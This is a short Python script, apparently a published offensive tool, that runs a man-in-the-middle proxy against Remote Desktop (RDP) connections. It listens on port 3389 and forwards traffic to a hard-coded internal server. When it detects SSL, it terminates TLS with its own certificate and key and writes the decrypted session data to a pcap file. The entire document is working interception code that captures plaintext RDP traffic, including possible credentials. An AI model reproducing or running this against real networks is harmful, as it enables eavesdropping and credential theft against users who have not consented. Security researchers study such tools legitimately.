#!/usr/bin/env python
#DiabloHorn http://diablohorn.wordpress.com
#Inspired by: https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/
#Resources:
#   http://stackoverflow.com/questions/7574092/python-scapy-wrpcap-how-do-you-append-packets-to-a-pcap-file
#   http://efod.se/media/thesis.pdf

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys
from scapy.all import *
from socket import *
import ssl
import thread
import binascii

BUFF = 1024
OUTPUTPCAP = "output.pcap"
LISTENCON = ('0.0.0.0', 3389)
REMOTECON = ('10.50.0.125', 3389)

def savepcap(src,dst,data):
    pktdump = PcapWriter(OUTPUTPCAP, append=True, sync=True)
    pktinfo = Ether()/IP(src=src[0],dst=dst[0])/TCP(sport=src[1],dport=dst[1])/data
    pktdump.write(pktinfo)
    pktdump.close()
    
def handler(clientsock,addr):
    serversock = socket(AF_INET, SOCK_STREAM)
    serversock.connect(REMOTECON)
    
    #read client rdp data
    serversock.sendall(clientsock.recv(19))
    #read server rdp data and check if ssl
    temp = serversock.recv(19)
    clientsock.sendall(temp)
    if(temp[15] == '\x01'):
        print('Intercepting rdp session from %s' % clientsock.getpeername()[0])
        sslserversock = ssl.wrap_socket(serversock,ssl_version=ssl.PROTOCOL_TLSv1)
        sslserversock.do_handshake() #just in case
        sslclientsock = ssl.wrap_socket(clientsock, server_side=True,certfile='cert.pem',keyfile='cert.key',ssl_version=ssl.PROTOCOL_TLSv1)
        sslclientsock.do_handshake() #just in case
        thread.start_new_thread(trafficloop,(sslclientsock,sslserversock,True))
        thread.start_new_thread(trafficloop,(sslserversock,sslclientsock,True))
    else:
        print('Passing through %s' % clientsock.getpeername()[0])
        thread.start_new_thread(trafficloop,(clientsock,serversock,False))
        thread.start_new_thread(trafficloop,(serversock,clientsock,False))

def trafficloop(source,destination,dopcap):
    string = ' '
    try:
        while string:
            string = source.recv(BUFF)
            if string:
                if dopcap:
                    savepcap(source.getpeername(),destination.getpeername(),string)
                destination.sendall(string)
            else:
                source.shutdown(socket.SHUT_RD)
                destination.shutdown(socket.SHUT_WR) 
    except:
        print('some error happend')
        pass #being highly lazy
        
if __name__ == '__main__':
    serversock = socket(AF_INET, SOCK_STREAM)
    serversock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    serversock.bind(LISTENCON)
    serversock.listen(5)
    while 1:
        print('waiting for connection...')
        clientsock, addr = serversock.accept()
        print('...connected from:', addr)
        thread.start_new_thread(handler,(clientsock,addr))
